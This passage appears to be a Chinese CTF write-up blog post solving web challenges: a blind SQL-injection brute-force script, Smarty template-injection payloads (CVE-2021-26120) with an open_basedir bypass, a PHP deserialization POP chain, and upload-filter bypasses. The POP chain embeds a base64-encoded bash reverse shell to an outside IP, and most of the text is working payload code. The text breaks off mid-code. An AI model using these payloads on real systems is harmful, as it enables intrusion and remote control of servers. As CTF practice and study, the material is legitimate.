class="line">string=string.ascii_lowercase + string.ascii_uppercase+ string.digits + <span class="string">&#x27;_&#x27;</span>+<span class="string">&#x27;&#123;&#x27;</span>+<span class="string">&#x27;&#125;&#x27;</span>+<span class="string">&#x27;!&#x27;</span>+<span class="string">&#x27;@&#x27;</span>+<span class="string">&#x27;.&#x27;</span>+<span class="string">&#x27;~&#x27;</span></span><br><span class="line">flag=<span class="string">&#x27;&#x27;</span></span><br><span class="line">end=<span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">200</span>):</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> string:</span><br><span class="line">        payload=&#123;</span><br><span class="line">            <span class="comment"># &quot;username&quot;:&quot;&#x27;||`username`regexp+_utf8mb4&#x27;^&#123;0&#125;&#x27;COLLATE&#x27;utf8mb4_bin&#x27;||`password`regexp&#x27;&quot;.format(flag+i),</span></span><br><span class="line">            <span class="string">&quot;username&quot;</span>:<span class="string">&quot;&#x27;||`password`regexp+_utf8mb4&#x27;^&#123;0&#125;&#x27;COLLATE&#x27;utf8mb4_bin&#x27;||`password`regexp&#x27;&quot;</span>.<span class="built_in">format</span>(flag+i),</span><br><span class="line">            <span class="string">&quot;password&quot;</span>:<span class="string">&quot;1&quot;</span></span><br><span class="line">        &#125;</span><br><span class="line">        re = requests.post(url=url,data=payload)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&#x27;401&#x27;</span> <span class="keyword">in</span> re.text:</span><br><span class="line">            flag = flag+i</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="built_in">print</span>(i)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">&#x27;~&#x27;</span>:</span><br><span class="line">            end=<span class="number">1</span></span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line">    <span class="keyword">if</span> end==<span class="number">1</span>:</span><br><span class="line">        <span class="built_in">print</span>(flag)</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># print(payload)</span></span><br><span class="line"><span class="built_in">print</span>(i)</span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure>
<p>~号作为结束符在查询字符串最后，而点号作为任意单字符匹配则放在前一位，如果有未在查询字符串中的字符则匹配为点号<br>最后得到有两位未知的密码此时使用字符串集爆单字符即可</p>
<!-- ##
先使用`推本溯源`(`tui1 ben3 su4 yuan2`)获得四个音调大致情况，以及对t,b,t,s,ui,uan进行排除，再在满足条件的字典中搜索含有l,j,r,w,k,h等只会出现在声母中的字母，g,a,n,i,u等可能出现多种匹配的先不要排除， -->

<h1 id="hmg2021"><a href="#hmg2021" class="headerlink" title="hmg2021"></a>hmg2021</h1><p>忘报名了，赛后复现</p>
<h3 id="Smarty-calculator"><a href="#Smarty-calculator" class="headerlink" title="Smarty_calculator"></a>Smarty_calculator</h3><p>知识点：ssti模板注入，正则，同类函数的使用替换，open_basedir</p>
<p>题目描述：开发者自己修改了模板的规则</p>
<p>传入显示没有登录，通过<code>www.zip</code>源码泄露，查看<code>index.php</code>:</p>
<blockquote>
<p>if(isset($_COOKIE[‘login’])) {</p>
</blockquote>
<p>抓包传入一个</p>
<blockquote>
<p>cookie: login&#x3D;1</p>
</blockquote>
<p>由于题目显示smarty，猜测模板注入</p>
<p>输入：</p>
<blockquote>
<p>POST:data&#x3D;{7*7}</p>
</blockquote>
<p>返回49，输入：</p>
<blockquote>
<p>POST:data&#x3D;{$smarty.version}</p>
</blockquote>
<p>版本：<code>3.1.39</code></p>
<p>找到该版本的一个cve:<span class="exturl" data-url="aHR0cHM6Ly93d3cudmVudXN0ZWNoLmNvbS5jbi9uZXdfdHlwZS9hcXRnLzIwMjEwMjI2LzIyNDA5Lmh0bWw=">PHP Smarty模版代码注入漏洞（CVE-2021-26120）</span>以及参考的文章，也就是漏洞分析的文章<span class="exturl" data-url="aHR0cHM6Ly9zcmNpbmNpdGUuaW8vYmxvZy8yMDIxLzAyLzE4L3NtYXJ0eS10ZW1wbGF0ZS1lbmdpbmUtbXVsdGlwbGUtc2FuZGJveC1lc2NhcGUtdnVsbmVyYWJpbGl0aWVzLmh0bWw=">Smarty模板引擎多沙箱逃逸PHP代码注入漏洞</span></p>
<p>POC:</p>
<blockquote>
<p>string:{function+name&#x3D;’rce(){};system(“dir”);function+’}{&#x2F;function}\</p>
</blockquote>
<p>没回显</p>
<p>由于题目描述，可能修改了一些过滤规则，下载<code>3.1.39</code>源码：<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL3NtYXJ0eS1waHAvc21hcnR5L3JlbGVhc2VzP3BhZ2U9Mg==">源码下载地址</span>，使用<code>Beyond Compare</code>进行文件对比，在<code>s\src\Smarty\sysplugins\smarty_internal_compile_function.php</code>和源码中的<code>smarty-3.1.39\libs\sysplugins\smarty_internal_compile_function.php</code>对比中得到语句</p>
<p>原版源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/^[a-zA-Z0-9_\x80-\xff]+$/&#x27;</span>, <span class="variable">$_name</span>)) &#123;</span><br><span class="line"> <span class="variable">$compiler</span>-&gt;<span class="title function_ invoke__">trigger_template_error</span>(<span class="string">&quot;Function name contains invalid characters: <span class="subst">&#123;$_name&#125;</span>&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>题目源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/[a-zA-Z0-9_\x80-\xff](.*)+$/&#x27;</span>, <span class="variable">$_name</span>)) &#123;</span><br><span class="line">    <span class="variable">$compiler</span>-&gt;<span class="title function_ invoke__">trigger_template_error</span>(<span class="string">&quot;Function name contains invalid characters: <span class="subst">&#123;$_name&#125;</span>&quot;</span>, <span class="literal">null</span>, <span class="literal">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>增加了一个<code>(.*)</code>的规则，本地debug在这条语句下断点，原本的POC到这里检测的部分是：<code>&#39;rce()&#123;&#125;;system(&quot;dir&quot;);function &#39;</code></p>
<p>需要绕过这部分，可以看出，原本的POC是利用一个空格绕过了检测，原本的过滤是直到不再出现为止（非贪婪），但增加了<code>(.*)</code>之后，匹配会继续往前，直到本行首，但仅仅是单行匹配，使用换行，并且检测到第二行不存在即可</p>
<p>使用： </p>
<blockquote>
<p>data&#x3D;string:{function+name&#x3D;’rce(){};system(“dir”);function%0a+’}{&#x2F;function}</p>
</blockquote>
<p>换行绕过，但题目还有disable_function和open_basedir，老知识点了，使用ini_set函数和chdir函数进行目录穿越，再用scandir函数读取目录：</p>
<blockquote>
</blockquote>
<p>data&#x3D;string:{function+name&#x3D;’rce(){};chdir(“img”);ini_set(“open_basedir”,”..”);chdir(“..”);chdir(“..”);chdir(“..”);chdir(“..”);ini_set(“open_basedir”,”&#x2F;“);var_dump(scandir(“&#x2F;“))function%0a+’}{&#x2F;function}</p>
<p>得到flag在根目录下，使用base64绕过对flag的过滤，使用Php_strip_whitespace函数读取：</p>
<blockquote>
<p>data&#x3D;string:{function+name&#x3D;’rce(){};chdir(“img”);ini_set(“open_basedir”,”..”);chdir(“..”);chdir(“..”);chdir(“..”);chdir(“..”);ini_set(“open_basedir”,”&#x2F;“);var_dump(Php_strip_whitespace(base64_decode(L2ZsYWc)));function%0a+’}{&#x2F;function}</p>
</blockquote>
<h1 id="2022das三月赛"><a href="#2022das三月赛" class="headerlink" title="2022das三月赛"></a>2022das三月赛</h1><h3 id="ezpop"><a href="#ezpop" class="headerlink" title="ezpop"></a>ezpop</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">eval</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">new</span> <span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">v1</span>(<span class="variable language_">$this</span>-&gt;v2);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;v1-&gt;<span class="title function_ invoke__">world</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1 . <span class="string">&#x27;114514&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;f1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$a</span>, <span class="variable">$b</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;f1-&gt;<span class="title function_ invoke__">get_flag</span>();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a-&gt;<span class="title function_ invoke__">run</span>();</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;hello&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">run</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        (<span class="variable language_">$this</span>-&gt;m1)();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">get_flag</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;#&#x27;</span> . <span class="variable language_">$this</span>-&gt;m1);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>很好的签到题，直接构建poc:</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">crow</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v1</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$v2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fin</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$f1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">what</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mix</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$m1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title class_">fin</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1 = <span class="keyword">new</span> <span class="title class_">what</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a = <span class="keyword">new</span> <span class="title class_">fin</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;f1 = <span class="keyword">new</span> <span class="title class_">crow</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;f1-&gt;v1 = <span class="keyword">new</span> <span class="title class_">fin</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;f1-&gt;v1-&gt;f1 = <span class="keyword">new</span> <span class="title class_">mix</span>();</span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span>-&gt;f1-&gt;a-&gt;f1-&gt;v1-&gt;f1-&gt;m1 = <span class="string">&quot; echo exec(base64_decode(YmFzaCAtYyAnYmFzaCAtaT4mIC9kZXYvdGNwLzQ3LjEwNy41Ni4yNDQvODA4NiAwPiYxJw));&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// echo serialize($a);</span></span><br><span class="line"><span class="comment">// echo &quot;&lt;br&gt;&quot;;</span></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>));</span><br></pre></td></tr></table></figure>

<p>eval里面的<code>#</code>是单行注释，把注入的命令的最开始的空格替换成换行符<code>%0a</code>即可</p>
<p>查看phpinfo界面没有任何disable_function</p>
<p>因此直接rce</p>
<p>但直接查查不到，似乎只能输出一个，因此选择了弹shell，flag.php里是假flag，看见目录下一大堆同类名文件，直接<code>cat *</code>得到flag</p>
<h3 id="updgstore"><a href="#updgstore" class="headerlink" title="updgstore"></a>updgstore</h3><p>（赛后复现）</p>
<p>文件上传</p>
<p>上传phpinfo可以看到disable_function过滤了很多函数，但其实仔细搜索会发现很多函数没在里面，但上传就会发现有过滤，就卡死在这里了，赛后看wp才想起来大写绕过，真是大写的尴尬</p>
<p>总之使用Show_source成功读取到index.php的源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-----------------------------<span class="number">27879107436484325173113356327</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;upload_file&quot;</span>; filename=<span class="string">&quot;a.php&quot;</span></span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Show_source</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;Li4vaW5kZXgucGhw&quot;</span>));</span><br><span class="line">-----------------------------<span class="number">27879107436484325173113356327</span></span><br><span class="line">Content-Disposition: form-data; name=<span class="string">&quot;submit&quot;</span></span><br><span class="line"></span><br><span class="line">upload</span><br><span class="line">-----------------------------<span class="number">27879107436484325173113356327</span>--</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>可以看到过滤使用的方法是查找字符串，确实是可以使用大写绕过的</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">light</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glow</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span class="title">onsubmit</span>=&quot;<span class="title">return</span> <span class="title">checkFile</span>()&quot;&gt;</span></span><br><span class="line"><span class="class">    嘿伙计，传个火？！</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">input_file</span>&quot; <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">name</span>=&quot;<span class="title">upload_file</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">    &lt;<span class="title">input</span> <span class="title">class</span>=&quot;<span class="title">button</span>&quot; <span class="title">type</span>=&quot;<span class="title">submit</span>&quot; <span class="title">name</span>=&quot;<span class="title">submit</span>&quot; <span class="title">value</span>=&quot;<span class="title">upload</span>&quot;/&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">form</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">span</span>&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">flare</span>&quot;&gt;&lt;/<span class="title">span</span>&gt;&lt;<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">function</span> <span class="title">fun</span>($<span class="title">var</span>): <span class="title">bool</span></span>&#123;</span><br><span class="line">    <span class="variable">$blacklist</span> = [<span class="string">&quot;\$_&quot;</span>, <span class="string">&quot;eval&quot;</span>,<span class="string">&quot;copy&quot;</span> ,<span class="string">&quot;assert&quot;</span>,<span class="string">&quot;usort&quot;</span>,<span class="string">&quot;include&quot;</span>, <span class="string">&quot;require&quot;</span>, <span class="string">&quot;$&quot;</span>, <span class="string">&quot;^&quot;</span>, <span class="string">&quot;~&quot;</span>, <span class="string">&quot;-&quot;</span>, <span class="string">&quot;%&quot;</span>, <span class="string">&quot;*&quot;</span>,<span class="string">&quot;file&quot;</span>,<span class="string">&quot;fopen&quot;</span>,<span class="string">&quot;fwriter&quot;</span>,<span class="string">&quot;fput&quot;</span>,<span class="string">&quot;copy&quot;</span>,<span class="string">&quot;curl&quot;</span>,<span class="string">&quot;fread&quot;</span>,<span class="string">&quot;fget&quot;</span>,<span class="string">&quot;function_exists&quot;</span>,<span class="string">&quot;dl&quot;</span>,<span class="string">&quot;putenv&quot;</span>,<span class="string">&quot;system&quot;</span>,<span class="string">&quot;exec&quot;</span>,<span class="string">&quot;shell_exec&quot;</span>,<span class="string">&quot;passthru&quot;</span>,<span class="string">&quot;proc_open&quot;</span>,<span class="string">&quot;proc_close&quot;</span>, <span class="string">&quot;proc_get_status&quot;</span>,<span class="string">&quot;checkdnsrr&quot;</span>,<span class="string">&quot;getmxrr&quot;</span>,<span class="string">&quot;getservbyname&quot;</span>,<span class="string">&quot;getservbyport&quot;</span>, <span class="string">&quot;syslog&quot;</span>,<span class="string">&quot;popen&quot;</span>,<span class="string">&quot;show_source&quot;</span>,<span class="string">&quot;highlight_file&quot;</span>,<span class="string">&quot;`&quot;</span>,<span class="string">&quot;chmod&quot;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span>(<span class="variable">$blacklist</span> <span class="keyword">as</span> <span class="variable">$blackword</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strstr</span>(<span class="variable">$var</span>, <span class="variable">$blackword</span>)) <span class="keyword">return</span> True;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> False;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//设置上传目录</span></span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;UPLOAD_PATH&quot;</span>, <span class="string">&quot;./uploads&quot;</span>);</span><br><span class="line"><span class="variable">$msg</span> = <span class="string">&quot;Upload Success!&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;submit&#x27;</span>])) &#123;</span><br><span class="line"><span class="variable">$temp_file</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;tmp_name&#x27;</span>];</span><br><span class="line"><span class="variable">$file_name</span> = <span class="variable">$_FILES</span>[<span class="string">&#x27;upload_file&#x27;</span>][<span class="string">&#x27;name&#x27;</span>];</span><br><span class="line"><span class="variable">$ext</span> = <span class="title function_ invoke__">pathinfo</span>(<span class="variable">$file_name</span>,PATHINFO_EXTENSION);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/php/i&quot;</span>, <span class="title function_ invoke__">strtolower</span>(<span class="variable">$ext</span>)))&#123;</span><br><span class="line"><span class="keyword">die</span>(<span class="string">&quot;只要好看的php&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$content</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$temp_file</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">fun</span>(<span class="variable">$content</span>))&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;诶，被我发现了吧&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$new_file_name</span> = <span class="title function_ invoke__">md5</span>(<span class="variable">$file_name</span>).<span class="string">&quot;.&quot;</span>.<span class="variable">$ext</span>;</span><br><span class="line">        <span class="variable">$img_path</span> = UPLOAD_PATH . <span class="string">&#x27;/&#x27;</span> . <span class="variable">$new_file_name</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">move_uploaded_file</span>(<span class="variable">$temp_file</span>, <span class="variable">$img_path</span>))&#123;</span><br><span class="line">            <span class="variable">$is_upload</span> = <span class="literal">true</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="variable">$msg</span> = <span class="string">&#x27;Upload Failed!&#x27;</span>;</span><br><span class="line">            <span class="keyword">die</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;&lt;div style=&quot;color:#F00&quot;&gt;&#x27;</span>.<span class="variable">$msg</span>.<span class="string">&quot; Look here~ &quot;</span>.<span class="variable">$img_path</span>.<span class="string">&quot;&lt;/div&gt;&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>使用大写绕过匹配，include结合base64编码绕过，使用php伪协议以及base64-decode过滤器包含我们传的另一个文件即可执行任意代码，直接写</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">Include</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="string">&quot;cGhwOi8vZmlsdGVyL2NvbnZlcnQuYmFzZTY0LWRlY29kZS9yZXNvdXJjZT1lYzk2N2IyZDg3NDUzZmFkZGQ4YmJkODE5ZWMxNTVlYy5waHA=&quot;</span>));</span><br></pre></td></tr></table></figure>

<p>然后执行任意代码，我直接抄题目代码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;div <span class="class"><span class="keyword">class</span>=&quot;<span class="title">light</span>&quot;&gt;&lt;<span class="title">span</span> <span class="title">class</span>=&quot;<span class="title">glow</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">form</span> <span class="title">enctype</span>=&quot;<span class="title">multipart</span>/<span class="title">form</span>-<span class="title">data</span>&quot; <span class="title">method</span>=&quot;<span class="title">post</span>&quot; <span 